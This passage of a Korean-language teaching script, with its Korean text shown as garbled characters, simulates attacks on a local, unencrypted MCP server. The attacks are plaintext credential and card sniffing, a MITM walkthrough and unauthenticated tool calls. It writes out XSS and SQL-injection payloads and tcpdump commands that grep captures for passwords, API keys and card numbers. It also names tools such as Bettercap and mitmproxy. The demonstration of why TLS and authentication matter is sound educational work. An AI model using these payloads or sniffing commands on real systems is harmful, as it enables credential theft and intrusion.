                        "name": "get_api_key",
                        "arguments": {"username": "user1", "password": "password123"}
                    }
                }
            )

            try:
                result = await client.call_tool("get_api_key", {
                    "username": "user1",
                    "password": "password123"
                })
                print(f"   ğŸ“¡ ìš”ì²­ ì „ì†¡ë¨ (ì„±ê³µ)")
                print("   âœ… API í‚¤ ì¡°íšŒ ì„±ê³µ!")
                print(f"   ì‘ë‹µ: {str(result)[:100]}...")
                print("   âš ï¸  ì‚¬ìš©ì í¬ë¦¬ë´ì…œì´ í‰ë¬¸ìœ¼ë¡œ ë„¤íŠ¸ì›Œí¬ì— ë…¸ì¶œë˜ì—ˆìŠµë‹ˆë‹¤!")
            except Exception as e:
                print(f"   ğŸ“¡ ìš”ì²­ ì‹œë„ë¨ (ì˜¤ë¥˜: {type(e).__name__})")
                print("   âš ï¸  ì‚¬ìš©ì í¬ë¦¬ë´ì…œì´ í‰ë¬¸ìœ¼ë¡œ ë„¤íŠ¸ì›Œí¬ì— ë…¸ì¶œë˜ì—ˆìŠµë‹ˆë‹¤!")

            await asyncio.sleep(1)

            # 3. ê²°ì œ ì²˜ë¦¬
            print("\n3ï¸âƒ£ ê²°ì œ ì²˜ë¦¬...")
            sniffer.intercept_http_request(
                "POST", base_url,
                {"Content-Type": "application/json"},
                {
                    "params": {
                        "name": "process_payment",
                        "arguments": {
                            "card_number": "4532-1234-5678-9012",
                            "cvv": "123",
                            "amount": 99.99,
                            "merchant": "Online Store"
                        }
                    }
                }
            )

            try:
                result = await client.call_tool("process_payment", {
                    "card_number": "4532-1234-5678-9012",
                    "cvv": "123",
                    "amount": 99.99,
                    "merchant": "Online Store"
                })
                print(f"   ğŸ“¡ ìš”ì²­ ì „ì†¡ë¨ (ì„±ê³µ)")
                print("   âœ… ê²°ì œ ì²˜ë¦¬ ì„±ê³µ!")
                print(f"   ì‘ë‹µ: {str(result)[:100]}...")
                print("   âš ï¸  ì‹ ìš©ì¹´ë“œ ì •ë³´ê°€ í‰ë¬¸ìœ¼ë¡œ ë„¤íŠ¸ì›Œí¬ì— ë…¸ì¶œë˜ì—ˆìŠµë‹ˆë‹¤!")
            except Exception as e:
                print(f"   ğŸ“¡ ìš”ì²­ ì‹œë„ë¨ (ì˜¤ë¥˜: {type(e).__name__})")
                print("   âš ï¸  ì‹ ìš©ì¹´ë“œ ì •ë³´ê°€ í‰ë¬¸ìœ¼ë¡œ ë„¤íŠ¸ì›Œí¬ì— ë…¸ì¶œë˜ì—ˆìŠµë‹ˆë‹¤!")

    except Exception as e:
        print(f"âŒ í´ë¼ì´ì–¸íŠ¸ ì—°ê²° ì‹¤íŒ¨: {e}")

async def simulate_unauthorized_access():
    """ë¬´ë‹¨ ì ‘ê·¼ ê³µê²© ì‹œë®¬ë ˆì´ì…˜ - FastMCP Client ì‚¬ìš©"""
    print("\n\nğŸš¨ 3ë‹¨ê³„: ë¬´ë‹¨ ì ‘ê·¼ ê³µê²© ì‹œë®¬ë ˆì´ì…˜")
    print("=" * 60)
    print("ê³µê²©ìê°€ ì¸ì¦ ì—†ì´ HTTP MCP ì„œë²„ì— ì§ì ‘ ì ‘ê·¼ì„ ì‹œë„í•©ë‹ˆë‹¤.")

    base_url = "http://127.0.0.1:8000/mcp"
    client = Client(base_url)

    try:
        async with client:
            # ì„œë²„ íƒì§€ ë° ì—°ê²°
            print("\nğŸ” ì„œë²„ íƒì§€ ì¤‘...")
            await client.ping()
            print("âœ… íƒ€ê²Ÿ ì„œë²„ ë°œê²¬! (ì¸ì¦ ì—†ì´ ì ‘ê·¼ ê°€ëŠ¥)")

            # ë„êµ¬ ëª©ë¡ íšë“ ì‹œë„
            print("\nğŸ“‹ ì‚¬ìš© ê°€ëŠ¥í•œ ë„êµ¬ íƒìƒ‰...")
            tools = await client.list_tools()
            print(f"âœ… {len(tools)}ê°œ ë„êµ¬ ë°œê²¬:")
            for tool in tools:
                print(f"   - {tool.name}: {tool.description}")
            print("âš ï¸  ê³µê²©ìê°€ ëª¨ë“  ë„êµ¬ì— ë¬´ì œí•œ ì ‘ê·¼ ê°€ëŠ¥!")

            # ì•…ì˜ì  ê¸°ëŠ¥ ë‚¨ìš©
            print("\nğŸ’€ ì•…ì˜ì  ê¸°ëŠ¥ ë‚¨ìš© ì‹œë„...")
            malicious_requests = [
                {
                    "name": "add",
                    "arguments": {"a": 999999999, "b": 999999999},
                    "description": "ëŒ€ìš©ëŸ‰ ê³„ì‚°ìœ¼ë¡œ CPU ìì› ë‚¨ìš©"
                },
                {
                    "name": "create_greeting",
                    "arguments": {"name": "<script>alert('XSS')</script>"},
                    "description": "XSS ê³µê²© ì‹œë„"
                },
                {
                    "name": "create_greeting",
                    "arguments": {"name": "'; DROP TABLE users; --"},
                    "description": "SQL ì¸ì ì…˜ ì‹œë„"
                }
            ]

            attack_success_count = 0
            for req in malicious_requests:
                try:
                    result = await client.call_tool(req["name"], req["arguments"])
                    attack_success_count += 1
                    print(f"   {req['description']}: ì„±ê³µ")
                    print(f"     âš ï¸  ê³µê²© ì„±ê³µ - ì„œë²„ê°€ ì•…ì˜ì  ìš”ì²­ì„ ì²˜ë¦¬í•¨!")
                    print(f"     ê²°ê³¼: {str(result)[:100]}...")
                except Exception as e:
                    print(f"   {req['description']}: ì‹¤íŒ¨ ({type(e).__name__})")

            print("\nğŸ¯ ë¬´ë‹¨ ì ‘ê·¼ ê³µê²© ê²°ê³¼:")
            print("   âœ… ì¸ì¦ ì—†ì´ ì„œë²„ ì ‘ê·¼ ì„±ê³µ")
            print(f"   âœ… ëª¨ë“  ê¸°ëŠ¥ì— ë¬´ì œí•œ ì ‘ê·¼ ê°€ëŠ¥")
            if attack_success_count > 0:
                print(f"   âš ï¸  ì•…ì˜ì  ìš”ì²­ {attack_success_count}ê°œ ì„±ê³µ - ì„œë²„ê°€ ì…ë ¥ ê²€ì¦ ì—†ì´ ì²˜ë¦¬!")
            else:
                print(f"   â„¹ï¸  ì•…ì˜ì  ìš”ì²­ì€ íƒ€ì… ê²€ì¦ìœ¼ë¡œ ì°¨ë‹¨ë¨ (í•˜ì§€ë§Œ ì¸ì¦ì€ ì—¬ì „íˆ ì—†ìŒ!)")
            print("   âš ï¸  ì‹¬ê°í•œ ë³´ì•ˆ ì·¨ì•½ì  í™•ì¸!")

    except Exception as e:
        print(f"âŒ ì„œë²„ ì ‘ê·¼ ì‹¤íŒ¨: {e}")
        print("   MCP ì„œë²„ê°€ ì‹¤í–‰ë˜ì§€ ì•ŠìŒ (ì‹¤ì œë¡œëŠ” ë³´ì•ˆìƒ ì¢‹ì€ ìƒí™©)")

def check_server_running(host="127.0.0.1", port=8000):
    """ì„œë²„ê°€ ì‹¤í–‰ ì¤‘ì¸ì§€ í™•ì¸"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2)
        result = sock.connect_ex((host, port))
        sock.close()
        return result == 0
    except:
        return False

def show_tcpdump_guide():
    """tcpdump ì‚¬ìš© ê°€ì´ë“œ í‘œì‹œ"""
    print("\nğŸ“– ì‹¤ì œ ë„¤íŠ¸ì›Œí¬ íŠ¸ë˜í”½ ìº¡ì²˜ ê°€ì´ë“œ")
    print("=" * 60)
    print("ë‹¤ë¥¸ í„°ë¯¸ë„ì—ì„œ ë‹¤ìŒ ëª…ë ¹ì–´ë¥¼ ì‹¤í–‰í•˜ì—¬ ì‹¤ì œ íŠ¸ë˜í”½ì„ ìº¡ì²˜í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:")
    print()
    print("1. ì§ì ‘ ì„œë²„ íŠ¸ë˜í”½ ìº¡ì²˜:")
    print("   sudo tcpdump -i lo -A -s 0 'tcp port 8000' -w http_traffic.pcap")
    print()
    print("2. MITM í”„ë¡ì‹œ íŠ¸ë˜í”½ ìº¡ì²˜:")
    print("   sudo tcpdump -i lo -A -s 0 'tcp port 8888' -w mitm_traffic.pcap")
    print()
    print("3. ìº¡ì²˜ëœ íŠ¸ë˜í”½ ë¶„ì„:")
    print("   tcpdump -r http_traffic.pcap -A | grep -E 'password|api_key|card_number'")
    print()
    print("ğŸ’¡ íŒ: HTTP íŠ¸ë˜í”½ì€ í‰ë¬¸ì´ë¯€ë¡œ ëª¨ë“  ë°ì´í„°ê°€ ê·¸ëŒ€ë¡œ ë…¸ì¶œë©ë‹ˆë‹¤!")
    print("=" * 60)

async def run_sniffing_demo():
    """ë„¤íŠ¸ì›Œí¬ ìŠ¤ë‹ˆí•‘ ë°ëª¨"""
    print("\nğŸ” 1ë‹¨ê³„: ë„¤íŠ¸ì›Œí¬ ìŠ¤ë‹ˆí•‘ ë°ëª¨")
    print("=" * 60)
    print("HTTP í†µì‹ ì—ì„œ ë¯¼ê°í•œ ë°ì´í„°ê°€ í‰ë¬¸ìœ¼ë¡œ ë…¸ì¶œë˜ëŠ” ê²ƒì„ ì‹œì—°í•©ë‹ˆë‹¤.")
    
    # ìŠ¤ë‹ˆí•‘ ì‹œì‘
    sniffer.start_sniffing()
    
    # ì •ìƒ íŠ¸ë˜í”½ ì‹œë®¬ë ˆì´ì…˜
    await simulate_user_traffic()
    
    # ìŠ¤ë‹ˆí•‘ ì¤‘ì§€
    sniffer.stop_sniffing()
    
    # ìº¡ì²˜ëœ ë°ì´í„° ë¶„ì„
    sniffer.analyze_captured_data()
    
    print("\nâœ… ìŠ¤ë‹ˆí•‘ ë°ëª¨ ì™„ë£Œ - ëª¨ë“  HTTP ë°ì´í„°ê°€ í‰ë¬¸ìœ¼ë¡œ ë…¸ì¶œë¨ì„ í™•ì¸í–ˆìŠµë‹ˆë‹¤!")

async def run_mitm_demo():
    """MITM ê³µê²© ë°ëª¨ - ê°œë… ì„¤ëª…"""
    print("\n\nğŸ•µï¸ 2ë‹¨ê³„: ì¤‘ê°„ì ê³µê²©(MITM) ê°œë… ë°ëª¨")
    print("=" * 60)
    print("HTTP í†µì‹ ì—ì„œ MITM ê³µê²©ì´ ê°€ëŠ¥í•œ ì´ìœ ë¥¼ ì„¤ëª…í•©ë‹ˆë‹¤.")

    print("\nğŸ’¡ MITM ê³µê²© ì‘ë™ ì›ë¦¬:")
    print("   1. ê³µê²©ìê°€ ë„¤íŠ¸ì›Œí¬ ê²½ë¡œì— í”„ë¡ì‹œ ì„œë²„ë¥¼ ì„¤ì¹˜")
    print("   2. ARP ìŠ¤í‘¸í•‘/DNS ìŠ¤í‘¸í•‘ìœ¼ë¡œ íŠ¸ë˜í”½ì„ í”„ë¡ì‹œë¡œ ìœ ë„")
    print("   3. í”„ë¡ì‹œê°€ ëª¨ë“  ìš”ì²­/ì‘ë‹µì„ ê°€ë¡œì±„ê³  ë¶„ì„")
    print("   4. ë°ì´í„° ë³€ì¡° í›„ ì „ë‹¬ (í”¼í•´ìëŠ” ì¸ì§€ ë¶ˆê°€)")

    print("\nğŸ¯ HTTPì—ì„œ ê°€ëŠ¥í•œ MITM ê³µê²©:")
    print("   âœ… ë¹„ë°€ë²ˆí˜¸ íƒˆì·¨ - í‰ë¬¸ìœ¼ë¡œ ì „ì†¡ë˜ë¯€ë¡œ ì¦‰ì‹œ ë…¸ì¶œ")
    print("   âœ… ì„¸ì…˜ í† í° íƒˆì·¨ - ë¡œê·¸ì¸ ìƒíƒœ í•˜ì´ì¬í‚¹")
    print("   âœ… ê²°ì œ ê¸ˆì•¡ ë³€ì¡° - $100 â†’ $1000ìœ¼ë¡œ ë³€ê²½ ê°€ëŠ¥")
    print("   âœ… ì‘ë‹µ ë³€ì¡° - ì•…ì„± ìŠ¤í¬ë¦½íŠ¸/ë©€ì›¨ì–´ ì£¼ì…")
    print("   âœ… ë°ì´í„° ìˆ˜ì§‘ - ëª¨ë“  API í‚¤, ê°œì¸ì •ë³´ ì €ì¥")

    print("\nğŸ” ì‹¤ì œ ê³µê²© ì˜ˆì‹œ:")
    print("   í”¼í•´ì: login(username='admin', password='admin123')")
    print("   â†’ í”„ë¡ì‹œ ê°€ë¡œì±”: {'username': 'admin', 'password': 'admin123'}")
    print("   â†’ ê³µê²©ì ì €ì¥: admin:admin123")
    print("   â†’ ì„œë²„ë¡œ ì „ë‹¬: (ì •ìƒ ì²˜ë¦¬ë¨)")
    print("   â†’ í”¼í•´ì: (ê³µê²©ë‹¹í•œ ì‚¬ì‹¤ì„ ëª¨ë¦„)")

    print("\nğŸ’³ ê²°ì œ ë³€ì¡° ì˜ˆì‹œ:")
    print("   í”¼í•´ì: process_payment(amount=99.99)")
    print("   â†’ í”„ë¡ì‹œ ë³€ì¡°: amount=999.99 (10ë°° ì¦ê°€!)")
    print("   â†’ ì„œë²„ ì²˜ë¦¬: $999.99 ê²°ì œ ì™„ë£Œ")
    print("   â†’ í”¼í•´ì: $99.99 ê²°ì œí–ˆë‹¤ê³  ì°©ê°")

    print("\nâš ï¸  HTTPì˜ ê·¼ë³¸ì  ë¬¸ì œ:")
    print("   - ì•”í˜¸í™” ì—†ìŒ â†’ ëª¨ë“  ë°ì´í„° í‰ë¬¸ ë…¸ì¶œ")
    print("   - ì¸ì¦ ì—†ìŒ â†’ ì¤‘ê°„ì ì¡´ì¬ íƒì§€ ë¶ˆê°€")
    print("   - ë¬´ê²°ì„± ë³´ì¥ ì—†ìŒ â†’ ë³€ì¡° íƒì§€ ë¶ˆê°€")

    print("\nâœ… HTTPS/TLS ë°©ì–´ ë©”ì»¤ë‹ˆì¦˜:")
    print("   - ì¢…ë‹¨ê°„ ì•”í˜¸í™” â†’ í”„ë¡ì‹œê°€ ë‚´ìš© í•´ë… ë¶ˆê°€")
    print("   - ì¸ì¦ì„œ ê²€ì¦ â†’ ì¤‘ê°„ì íƒì§€ ê°€ëŠ¥")
    print("   - ë¬´ê²°ì„± ê²€ì¦ â†’ ë³€ì¡° ì¦‰ì‹œ ê°ì§€")

    print("\nâœ… MITM ê°œë… ë°ëª¨ ì™„ë£Œ!")

async def main():
    """ë©”ì¸ ì‹¤í–‰ í•¨ìˆ˜"""
    print("ğŸ”“ HTTP ë³´ì•ˆ ì·¨ì•½ì  ê³µê²© ì‹œë®¬ë ˆì´ì…˜")
    print("=" * 60)
    print("ì´ ë°ëª¨ëŠ” ì•”í˜¸í™”ë˜ì§€ ì•Šì€ HTTP í†µì‹ ì˜ ìœ„í—˜ì„±ì„ ë³´ì—¬ì¤ë‹ˆë‹¤.")
    print("1. ë„¤íŠ¸ì›Œí¬ ìŠ¤ë‹ˆí•‘: í‰ë¬¸ ë°ì´í„° ë…¸ì¶œ")
    print("2. MITM ê³µê²©: íŠ¸ë˜í”½ ê°€ë¡œì±„ê¸° ë° ë³€ì¡°")
    print("3. ë¬´ë‹¨ ì ‘ê·¼: ì¸ì¦ ì—†ëŠ” ì„œë²„ ê³µê²©")
    
    # MCP ì„œë²„ ìƒíƒœ í™•ì¸
    print("\nğŸ” MCP ì„œë²„ ì—°ê²° í™•ì¸ ì¤‘...")
    if check_server_running():
        print("âœ… MCP ì„œë²„ê°€ ì‹¤í–‰ ì¤‘ì…ë‹ˆë‹¤.")
    else:
        print("âš ï¸  MCP ì„œë²„ê°€ ì‹¤í–‰ë˜ì§€ ì•ŠìŠµë‹ˆë‹¤.")
        print("   ì¼ë¶€ ê¸°ëŠ¥ì€ ì‹œë®¬ë ˆì´ì…˜ìœ¼ë¡œë§Œ ë™ì‘í•©ë‹ˆë‹¤.")
        print("   ì‹¤ì œ ì„œë²„ í…ŒìŠ¤íŠ¸ë¥¼ ì›í•˜ì‹œë©´ ë‹¤ìŒ ëª…ë ¹ì„ ì‹¤í–‰í•˜ì„¸ìš”:")
        print("   python3 http_server.py")
    
    # tcpdump ê°€ì´ë“œ í‘œì‹œ
    show_tcpdump_guide()
    
    print("\nâ³ 3ì´ˆ í›„ ê³µê²© ì‹œë®¬ë ˆì´ì…˜ì„ ì‹œì‘í•©ë‹ˆë‹¤...")
    await asyncio.sleep(3)
    
    try:
        # 1ë‹¨ê³„: ë„¤íŠ¸ì›Œí¬ ìŠ¤ë‹ˆí•‘ ë°ëª¨
        await run_sniffing_demo()
        
        # 2ë‹¨ê³„: MITM ê³µê²© ë°ëª¨
        await run_mitm_demo()
        
        # 3ë‹¨ê³„: ë¬´ë‹¨ ì ‘ê·¼ ê³µê²©
        await simulate_unauthorized_access()
        
        # ì „ì²´ ìš”ì•½
        print("\n\nğŸš¨ HTTP í†µì‹  ë³´ì•ˆ ìœ„í—˜ ìš”ì•½")
        print("=" * 60)
        print("1. ë„¤íŠ¸ì›Œí¬ ìŠ¤ë‹ˆí•‘")
        print("   - ëª¨ë“  HTTP íŠ¸ë˜í”½ì„ ì‹¤ì‹œê°„ìœ¼ë¡œ ëª¨ë‹ˆí„°ë§ ê°€ëŠ¥")
        print("   - ë¯¼ê°í•œ ë°ì´í„°(ë¹„ë°€ë²ˆí˜¸, ì¹´ë“œì •ë³´ ë“±) íƒˆì·¨ ê°€ëŠ¥")
        print("   - í”¼í•´ìëŠ” ê³µê²©ì„ ì¸ì§€í•˜ì§€ ëª»í•¨")
        print()
        print("2. ì¤‘ê°„ì ê³µê²©(MITM)")
        print("   - ìš”ì²­/ì‘ë‹µ ë°ì´í„°ë¥¼ ì„ì˜ë¡œ ë³€ì¡° ê°€ëŠ¥")
        print("   - ê²°ì œ ê¸ˆì•¡ ë³€ì¡°, ì•…ì„± ì‘ë‹µ ì£¼ì… ë“±")
        print("   - ì™„ì „í•œ í†µì‹  ì œì–´ê¶Œ íšë“")
        print()
        print("3. ë¬´ë‹¨ ì ‘ê·¼")
        print("   - ì¸ì¦ ì—†ì´ ëª¨ë“  ì„œë²„ ê¸°ëŠ¥ì— ì ‘ê·¼")
        print("   - ì•…ì˜ì  ì…ë ¥ ë° ë¦¬ì†ŒìŠ¤ ë‚¨ìš©")
        print("   - ì„œë¹„ìŠ¤ ê±°ë¶€ ê³µê²©(DoS) ê°€ëŠ¥")
        print()
        print("âœ… í•´ê²°ì±…: HTTPS/TLS + ì¸ì¦ ì‹œìŠ¤í…œ")
        print("   - ëª¨ë“  ë°ì´í„° ì•”í˜¸í™” ì „ì†¡ (TLS)")
        print("   - ì„œë²„ ì¸ì¦ìœ¼ë¡œ MITM ë°©ì–´ (TLS)")
        print("   - ì‚¬ìš©ì ì¸ì¦ìœ¼ë¡œ ë¬´ë‹¨ ì ‘ê·¼ ë°©ì§€ (JWT/OAuth)")
        print("   - ë°ì´í„° ë¬´ê²°ì„± ë³´ì¥ (TLS)")
        
    except KeyboardInterrupt:
        print("\nğŸ›‘ ì‹œë®¬ë ˆì´ì…˜ì´ ì‚¬ìš©ìì— ì˜í•´ ì¤‘ë‹¨ë˜ì—ˆìŠµë‹ˆë‹¤.")
    except Exception as e:
        print(f"\nâŒ ì‹œë®¬ë ˆì´ì…˜ ì¤‘ ì˜¤ë¥˜ ë°œìƒ: {e}")

if __name__ == "__main__":
    """
    ê³µê²© ì‹œë®¬ë ˆì´ì…˜ ì‹¤í–‰

    ì‹¤í–‰ ë°©ë²•:
    1. ë¨¼ì € HTTP ì„œë²„ ì‹œì‘:
       Terminal 1: python3 http_server.py

    2. ê³µê²© ì‹œë®¬ë ˆì´ì…˜ ì‹¤í–‰:
       Terminal 2: python3 attack_simulation.py

    3. ì„ íƒì‚¬í•­: ì‹¤ì œ íŠ¸ë˜í”½ ìº¡ì²˜
       Terminal 3: sudo tcpdump -i lo -A -s 0 'tcp port 8000'

    ë˜ëŠ” Docker í™˜ê²½:
    make shell python3 Part2_SSL/No_TLS/attack_simulation.py

    ê¸°ëŒ€ ê²°ê³¼:
    - 1ë‹¨ê³„: ë„¤íŠ¸ì›Œí¬ ìŠ¤ë‹ˆí•‘ìœ¼ë¡œ í‰ë¬¸ ë°ì´í„° ë…¸ì¶œ í™•ì¸
    - 2ë‹¨ê³„: MITM ê³µê²©ìœ¼ë¡œ ë°ì´í„° ë³€ì¡° ì‹œì—°
    - 3ë‹¨ê³„: ë¬´ë‹¨ ì ‘ê·¼ìœ¼ë¡œ ì¸ì¦ ì—†ëŠ” ì„œë²„ ê³µê²© í™•ì¸
    """
    asyncio.run(main())


# ===========================================
# ì¢…í•© í•™ìŠµ ì •ë¦¬
# ===========================================
"""
ì´ íŒŒì¼ì—ì„œ ë°°ìš´ ë‚´ìš©:

1. ë„¤íŠ¸ì›Œí¬ ìŠ¤ë‹ˆí•‘ ê³µê²©

   ê³µê²© ë©”ì»¤ë‹ˆì¦˜:
   - ë„¤íŠ¸ì›Œí¬ ì¸í„°í˜ì´ìŠ¤ë¥¼ í”„ë¡œë¯¸ìŠ¤íì–´ìŠ¤ ëª¨ë“œë¡œ ì„¤ì •
   - ëª¨ë“  ë„¤íŠ¸ì›Œí¬ íŒ¨í‚· ìº¡ì²˜
   - HTTP íŠ¸ë˜í”½ í•„í„°ë§ ë° ë¶„ì„
   - ë¯¼ê°í•œ ë°ì´í„° ì¶”ì¶œ

   ì‹¤ì œ ë„êµ¬:
   - tcpdump: sudo tcpdump -i eth0 -A -s 0 'tcp port 80'
   - Wireshark: GUIë¡œ íŒ¨í‚· ë¶„ì„
   - tshark: Wiresharkì˜ CLI ë²„ì „
   - Ettercap: MITM + ìŠ¤ë‹ˆí•‘

   ì¶”ì¶œ ê°€ëŠ¥í•œ ë°ì´í„°:
   - HTTP ìš”ì²­/ì‘ë‹µ ì „ì²´
   - ë¡œê·¸ì¸ ì •ë³´ (username, password)
   - API í‚¤ (Authorization í—¤ë”)
   - ì‹ ìš©ì¹´ë“œ ì •ë³´
   - ì„¸ì…˜ ì¿ í‚¤/í† í°
   - ê°œì¸ì •ë³´ (ì´ë¦„, ì£¼ì†Œ, ì „í™”ë²ˆí˜¸)

   ê³µê²© ê°€ëŠ¥ í™˜ê²½:
   - ê³µê°œ WiFi (ì¹´í˜, ê³µí•­, í˜¸í…”)
   - ê°™ì€ LANì˜ ë‹¤ë¥¸ ì»´í“¨í„°
   - ISP ë ˆë²¨ (ì •ë¶€/í†µì‹ ì‚¬)
   - ë¼ìš°í„°/ìŠ¤ìœ„ì¹˜ í•´í‚¹

2. ì¤‘ê°„ì ê³µê²© (MITM)

   ê³µê²© ë©”ì»¤ë‹ˆì¦˜:
   - í´ë¼ì´ì–¸íŠ¸ì™€ ì„œë²„ ì‚¬ì´ì— í”„ë¡ì‹œ ì„œë²„ ì„¤ì¹˜
   - ì–‘ìª½ íŠ¸ë˜í”½ì„ ëª¨ë‘ ì¤‘ê³„í•˜ë©° ê°ì²­/ë³€ì¡°
   - í”¼í•´ìëŠ” ì •ìƒ í†µì‹ ì´ë¼ê³  ì°©ê°

   MITM êµ¬ì¶• ë°©ë²•:
   - ARP ìŠ¤í‘¸í•‘: ê°™ì€ ë„¤íŠ¸ì›Œí¬ì—ì„œ MAC ì£¼ì†Œ ì†ì´ê¸°
   - DNS ìŠ¤í‘¸í•‘: DNS ì‘ë‹µ ì¡°ì‘ìœ¼ë¡œ ì˜ëª»ëœ ì„œë²„ ì—°ê²°
   - DHCP ìŠ¤í‘¸í•‘: DHCP ì„œë²„ ì—­í•  ìˆ˜í–‰
   - ì•…ì„± WiFi AP: ê³µê²©ìê°€ ìš´ì˜í•˜ëŠ” WiFi
   - BGP í•˜ì´ì¬í‚¹: ë¼ìš°íŒ… í”„ë¡œí† ì½œ ì¡°ì‘

   ë³€ì¡° ê°€ëŠ¥í•œ í•­ëª©:
   - ìš”ì²­ ë°ì´í„° (íŒŒë¼ë¯¸í„° ë³€ê²½)
   - ì‘ë‹µ ë°ì´í„° (ì•…ì„± ìŠ¤í¬ë¦½íŠ¸ ì£¼ì…)
   - ê²°ì œ ê¸ˆì•¡ (ì´ ì˜ˆì œì—ì„œ ì‹œì—°)
   - ë‹¤ìš´ë¡œë“œ íŒŒì¼ (ë©€ì›¨ì–´ ì£¼ì…)

   ì‹¤ì œ ë„êµ¬:
   - Bettercap: bettercap -iface eth0
   - mitmproxy: mitmproxy --mode transparent
   - Burp Suite: ì›¹ í”„ë¡ì‹œ + ì¸í„°ì…‰í„°

3. ë¬´ë‹¨ ì ‘ê·¼ ê³µê²©

   ê³µê²© ë‹¨ê³„:
   1. ì„œë²„ íƒì§€ (í¬íŠ¸ ìŠ¤ìºë‹)
   2. ì¸ì¦ ìš°íšŒ í™•ì¸
   3. ë„êµ¬ ëª©ë¡ íšë“
   4. ì•…ì˜ì  ê¸°ëŠ¥ ë‚¨ìš©

   ê³µê²© ìœ í˜•:
   - ë¦¬ì†ŒìŠ¤ ë‚¨ìš© (CPU, ë©”ëª¨ë¦¬, ë””ìŠ¤í¬)
   - ì„œë¹„ìŠ¤ ê±°ë¶€ ê³µê²© (DoS)
   - ë°ì´í„° íƒˆì·¨
   - ì•…ì˜ì  ì…ë ¥ (XSS, SQLi)

   ì¸ì¦ì´ ì—†ì„ ë•Œì˜ ìœ„í—˜:
   - ëˆ„êµ¬ë‚˜ ëª¨ë“  ê¸°ëŠ¥ ì ‘ê·¼ ê°€ëŠ¥
   - Rate Limiting ì—†ìŒ
   - ê°ì‚¬ ë¡œê¹… ì—†ìŒ
   - ê³µê²© ì¶”ì  ë¶ˆê°€ëŠ¥

4. HTTP vs HTTPS ë³´ì•ˆ ë¹„êµ

   HTTP (ì´ ì˜ˆì œ):
   - ëª¨ë“  ë°ì´í„° í‰ë¬¸ ì „ì†¡
   - ìŠ¤ë‹ˆí•‘ ê°€ëŠ¥
   - MITM ê°€ëŠ¥
   - ë°ì´í„° ë¬´ê²°ì„± ë³´ì¥ ì—†ìŒ

   HTTPS:
   - TLSë¡œ ëª¨ë“  ë°ì´í„° ì•”í˜¸í™”
   - ìŠ¤ë‹ˆí•‘í•´ë„ í•´ë… ë¶ˆê°€
   - MITM ì‹œë„ ì‹œ ì¸ì¦ì„œ ì˜¤ë¥˜ ë°œìƒ
   - ë°ì´í„° ë¬´ê²°ì„± ë³´ì¥ (í•´ì‹œ)

   ì•”í˜¸í™” íš¨ê³¼:
   - í‰ë¬¸: "password: admin123" â†’ ê·¸ëŒ€ë¡œ ë…¸ì¶œ
   - ì•”í˜¸í™”: "Hs7$k2@mP..." â†’ í•´ë… ë¶ˆê°€ëŠ¥

5. ì‹¤ì œ ê³µê²© ì‚¬ë¡€

   Target ì¹´ë“œ ì •ë³´ ìœ ì¶œ (2013):
   - 4ì²œë§Œ ê°œ ì¹´ë“œ ì •ë³´ ìœ ì¶œ
   - ë„¤íŠ¸ì›Œí¬ íŠ¸ë˜í”½ ëª¨ë‹ˆí„°ë§ìœ¼ë¡œ ìˆ˜ì§‘
   - ì•”í˜¸í™”ë˜ì§€ ì•Šì€ ë‚´ë¶€ í†µì‹  ì•…ìš©

   WiFi ìŠ¤ë‹ˆí•‘ ì‚¬ê±´ (ì§€ì†ì ):
   - ê³µê°œ WiFiì—ì„œ HTTP íŠ¸ë˜í”½ ìº¡ì²˜
   - ì´ë©”ì¼, ë¹„ë°€ë²ˆí˜¸, ì¿ í‚¤ ìˆ˜ì§‘
   - ê³„ì • íƒˆì·¨ ë° ì‹ ì› ë„ìš©

   MITM ê³µê²© ì‚¬ë¡€:
   - êµ­ê°€ ë ˆë²¨: ì¤‘êµ­ Great Firewall
   - ISP ë ˆë²¨: ê´‘ê³  ì£¼ì…
   - ê³µí•­ WiFi: í”¼ì‹± í˜ì´ì§€ ì£¼ì…

6. ë²•ì  ì±…ì„

   ì´ëŸ° ê³µê²©ì€ ë¶ˆë²•ì…ë‹ˆë‹¤:
   - ì»´í“¨í„°ë²”ì£„ì²˜ë²Œë²• ìœ„ë°˜
   - í†µì‹ ë¹„ë°€ë³´í˜¸ë²• ìœ„ë°˜
   - ê°œì¸ì •ë³´ë³´í˜¸ë²• ìœ„ë°˜

   ì²˜ë²Œ:
   - ì§•ì—­ 3ë…„ ì´ìƒ
   - ë²Œê¸ˆ ìˆ˜ì–µ ì›
   - ë¯¼ì‚¬ ì†í•´ë°°ìƒ

   í•©ë²•ì  ì‚¬ìš©:
   - ìì‹ ì˜ ì‹œìŠ¤í…œ í…ŒìŠ¤íŠ¸
   - ëª…ì‹œì  í—ˆê°€ ë°›ì€ ëª¨ì˜í•´í‚¹
   - êµìœ¡ ëª©ì  ì‹œë®¬ë ˆì´ì…˜ (ì´ ì˜ˆì œ)

7. ë°©ì–´ ë©”ì»¤ë‹ˆì¦˜

   ê¸°ë³¸ ë°©ì–´:
   - HTTPS/TLS ì‚¬ìš© (í•„ìˆ˜!)
   - ì¸ì¦ ì‹œìŠ¤í…œ (JWT, OAuth)
   - Rate Limiting
   - ì…ë ¥ ê²€ì¦

   ê³ ê¸‰ ë°©ì–´:
   - Certificate Pinning: íŠ¹ì • ì¸ì¦ì„œë§Œ ì‹ ë¢°
   - HSTS: Strict-Transport-Security í—¤ë”
   - HPKP: Public Key Pinning
   - ë„¤íŠ¸ì›Œí¬ ê²©ë¦¬ (VLAN)

   ëª¨ë‹ˆí„°ë§:
   - IDS/IPS: ì¹¨ì… íƒì§€/ë°©ì§€ ì‹œìŠ¤í…œ
   - íŠ¸ë˜í”½ ë¶„ì„
   - ì´ìƒ íƒì§€
   - ë¡œê·¸ ê°ì‚¬

8. ë‹¤ìŒ í•™ìŠµ ë‹¨ê³„

   - secure_fastapi_mcp_server.py í•™ìŠµ
     * HTTPS ì‚¬ìš©ìœ¼ë¡œ ì•”í˜¸í™”
     * ì¸ì¦ì„œ ì„¤ì • (certificate_management.py)
     * ë™ì¼í•œ ê³µê²© ì‹œë„ ì‹œ ì‹¤íŒ¨ í™•ì¸

   - secure_attack_simulation.py ì‹¤í–‰
     * HTTPS íŠ¸ë˜í”½ ìŠ¤ë‹ˆí•‘ ì‹œë„
     * ì•”í˜¸í™”ëœ ë°ì´í„° í™•ì¸
     * MITM ê³µê²© ì‹¤íŒ¨ í™•ì¸

   - TLS í”„ë¡œí† ì½œ ì´í•´
